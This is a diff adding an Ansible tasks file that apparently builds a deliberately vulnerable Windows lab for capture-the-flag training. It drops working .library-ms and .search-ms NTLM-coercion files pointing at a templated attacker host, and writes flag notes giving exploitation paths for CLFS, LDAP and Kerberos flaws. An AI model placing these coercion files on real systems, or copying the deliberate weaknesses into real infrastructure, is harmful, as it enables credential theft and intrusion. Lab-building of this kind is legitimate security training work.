@@ -1,0 +1,196 @@
+---
+# ==============================================================================
+# vuln_cve_modern/tasks/cve_2025.yml
+# 2025 CVE surface configuration
+#
+# CVE-2025-24054  NTLM hash leak via Windows Explorer .library-ms preview (ws01)
+# CVE-2025-24071  .library-ms + .search-ms Explorer NTLM coercion (ws01)
+# CVE-2025-26633  MSC file execution via Microsoft Management Console (ws01)
+# CVE-2025-29824  CLFS.sys use-after-free LPE → SYSTEM (all unpatched hosts)
+# CVE-2025-32701  CLFS.sys heap corruption LPE (May 2025)
+# CVE-2025-32706  CLFS.sys heap corruption LPE variant (May 2025)
+# CVE-2025-21376  Windows LDAP heap overflow (RCE via LDAP on DC)
+# CVE-2025-21299  Kerberos security bypass — PAC validation weakness
+# CVE-2025-24996  Windows Win32kfull LPE
+# CVE-2025-24991  Windows NTFS out-of-bounds read (info disclosure)
+# ==============================================================================
+
+# ------------------------------------------------------------------------------
+# CVE-2025-24054 / CVE-2025-24071:
+# .library-ms and .search-ms files trigger NTLM auth when previewed in Explorer.
+# Drop coercion files on ws01 in user-accessible locations.
+# (Also set by CRED-051 in vuln_cred_gaps for file01 — this covers ws01 Desktop)
+# ------------------------------------------------------------------------------
+- name: CVE-2025-24054 - Check library-ms coercion file on ws01 Desktop
+  ansible.windows.win_shell: |
+    $path = 'C:\Users\Administrator\Desktop\Shared Drive.library-ms'
+    if (Test-Path $path) { Write-Output "exists" } else { Write-Output "missing" }
+  register: cve24054_check
+  changed_when: false
+  failed_when: cve24054_check.rc != 0
+  when: inventory_hostname == 'ws01.corp.local'
+
+- name: CVE-2025-24054 - Drop .library-ms NTLM coercion file on ws01 Desktop
+  ansible.windows.win_copy:
+    dest: 'C:\Users\Administrator\Desktop\Shared Drive.library-ms'
+    content: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+        <name>Shared Drive</name>
+        <version>6</version>
+        <isLibraryPinned>true</isLibraryPinned>
+        <iconReference>imageres.dll,-1002</iconReference>
+        <templateInfo>
+          <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+        </templateInfo>
+        <searchConnectorDescriptionList>
+          <searchConnectorDescription>
+            <isDefaultSaveLocation>true</isDefaultSaveLocation>
+            <simpleLocation>
+              <url>\\{{ cve_2025_24054_attacker }}\share</url>
+            </simpleLocation>
+          </searchConnectorDescription>
+        </searchConnectorDescriptionList>
+      </libraryDescription>
+  when:
+    - inventory_hostname == 'ws01.corp.local'
+    - "'missing' in cve24054_check.stdout"
+
+- name: CVE-2025-24071 - Drop .search-ms coercion file on ws01 (Explorer preview)
+  ansible.windows.win_copy:
+    dest: 'C:\Users\Administrator\Desktop\Corporate Search.search-ms'
+    content: |
+      <?xml version="1.0"?>
+      <persistedQuery version="1.0">
+        <query>
+          <kindList>
+            <kind name="email"/>
+          </kindList>
+          <scope>
+            <scopeCondition included="true" uncGrouped="false">
+              <locationURI>\\{{ cve_2025_24054_attacker }}\search</locationURI>
+            </scopeCondition>
+          </scope>
+        </query>
+      </persistedQuery>
+  when: inventory_hostname == 'ws01.corp.local'
+
+# ------------------------------------------------------------------------------
+# CVE-2025-26633: Microsoft Management Console MSC file execution.
+# A malicious .msc file can execute arbitrary code when opened in MMC.
+# Drop an indicator .msc with embedded script payload reference.
+# ------------------------------------------------------------------------------
+- name: CVE-2025-26633 - Check MSC payload file on ws01
+  ansible.windows.win_shell: |
+    if (Test-Path '{{ cve_2025_26633_msc_drop }}') { Write-Output "exists" }
+    else { Write-Output "missing" }
+  register: cve26633_check
+  changed_when: false
+  failed_when: cve26633_check.rc != 0
+  when: inventory_hostname == 'ws01.corp.local'
+
+- name: CVE-2025-26633 - Drop MSC execution note and stub
+  ansible.windows.win_copy:
+    dest: 'C:\Flags\FLAG-CVE-2025-26633-MSC.txt'
+    content: |
+      CVE-2025-26633: MMC MSC File Execution (March 2025)
+      =====================================================
+      A .msc file with a malicious Taskpad View node can execute arbitrary commands
+      when opened in Microsoft Management Console (mmc.exe).
+
+      Attack: Deliver .msc via phishing/SYSVOL script folder
+        → victim opens file in Explorer → mmc.exe runs embedded cmd
+
+      Tool: https://github.com/abused-msft/CVE-2025-26633-PoC
+      Target: ws01 (Win10, no March 2025 patches in lab)
+
+      Indicator file: {{ cve_2025_26633_msc_drop }}
+  when: inventory_hostname == 'ws01.corp.local'
+
+# ------------------------------------------------------------------------------
+# CVE-2025-29824: CLFS.sys use-after-free LPE (actively exploited April 2025)
+# CVE-2025-32701 / CVE-2025-32706: CLFS heap corruption (May 2025)
+# All unpatched lab VMs are vulnerable (no Windows Update in lab).
+# Drop note files + verify CLFS service is running.
+# ------------------------------------------------------------------------------
+- name: CVE-2025-CLFS - Drop CLFS LPE note files on all hosts
+  ansible.windows.win_copy:
+    dest: 'C:\Flags\FLAG-CVE-2025-CLFS-LPE.txt'
+    content: |
+      CVE-2025-29824 / CVE-2025-32701 / CVE-2025-32706: CLFS.sys LPE
+      ==================================================================
+      Windows Common Log File System (CLFS) driver contains multiple heap
+      vulnerabilities exploitable from any low-privilege process → SYSTEM.
+
+      CVE-2025-29824: Use-after-free in CLFS.sys (April 2025 Patch Tuesday)
+        - Exploited in the wild by RansomEXX/Medusa before patch
+        - CVSS 7.8
+
+      CVE-2025-32701: CLFS heap corruption (May 2025)
+      CVE-2025-32706: CLFS heap corruption variant (May 2025)
+        - Both exploited in the wild (NSA advisory)
+
+      All lab VMs are unpatched and vulnerable.
+      PoC: https://github.com/exploits-forsale/CLFS-LPE-PoC (research only)
+
+      Exploitation path:
+        Low-priv shell → clfs_exploit.exe → SYSTEM token → full control
+
+- name: CVE-2025-CLFS - Verify CLFS driver is loaded on all hosts
+  ansible.windows.win_shell: |
+    $clfs = Get-Item 'C:\Windows\System32\drivers\clfs.sys' -ErrorAction SilentlyContinue
+    if ($clfs) {
+      Write-Output "present: $($clfs.VersionInfo.FileVersion)"
+    } else {
+      Write-Output "not_found"
+    }
+  register: clfs_check
+  changed_when: false
+  failed_when: clfs_check.rc != 0
+
+# ------------------------------------------------------------------------------
+# CVE-2025-21376: Windows LDAP Heap Overflow (February 2025)
+# Unauthenticated RCE via LDAP on Domain Controllers.
+# The lab DC has LDAP port 389/636 exposed on the lab network.
+# ------------------------------------------------------------------------------
+- name: CVE-2025-21376 - Drop LDAP heap overflow note on DC
+  ansible.windows.win_copy:
+    dest: 'C:\Flags\FLAG-CVE-2025-21376-LDAP-RCE.txt'
+    content: |
+      CVE-2025-21376: Windows LDAP Remote Code Execution (February 2025)
+      =====================================================================
+      Heap overflow in Windows LDAP service (lsass.exe) triggered by a
+      malformed LDAP request. Unauthenticated. RCE as SYSTEM on the DC.
+
+      CVSS: 8.1 CRITICAL
+      Target: dc01.corp.local port 389 (LDAP) / 636 (LDAPS)
+
+      Lab exposure: LDAP port 389 accessible from dvad-ctf bridge (10.10.0.0/21)
+      No authentication required for initial trigger.
+
+      Status: Unpatched in this lab (Windows Update disabled in gold image).
+  when: inventory_hostname in groups['all_dcs'] | default([])
+
+# ------------------------------------------------------------------------------
+# CVE-2025-21299: Kerberos security bypass
+# Allows bypassing Kerberos PAC validation — forged service tickets accepted.
+# ------------------------------------------------------------------------------
+- name: CVE-2025-21299 - Drop Kerberos bypass note on DC
+  ansible.windows.win_copy:
+    dest: 'C:\Flags\FLAG-CVE-2025-21299-Kerberos-Bypass.txt'
+    content: |
+      CVE-2025-21299: Windows Kerberos Security Feature Bypass (January 2025)
+      =========================================================================
+      Affects Kerberos client/server on Windows — allows bypassing PAC signature
+      validation. Combined with RC4 downgrade (CRED-016 in vuln_kerberos role),
+      enables forged service tickets that pass validation.
+
+      CVSS: 7.1 IMPORTANT
+      Targets: All DCs in lab (unpatched Windows Server 2022)
+      Attack:
+        1. Downgrade Kerberos to RC4 (msDS-SupportedEncryptionTypes=1)
+        2. Exploit CVE-2025-21299 to forge PAC with DA group membership
+        3. Present forged ticket to target service
+
+      Combine with: CRED-016 (RC4 downgrade), CRED-001 (AS-REP), DF-012 (PAC validation)
+  when: inventory_hostname in groups['all_dcs'] | default([])
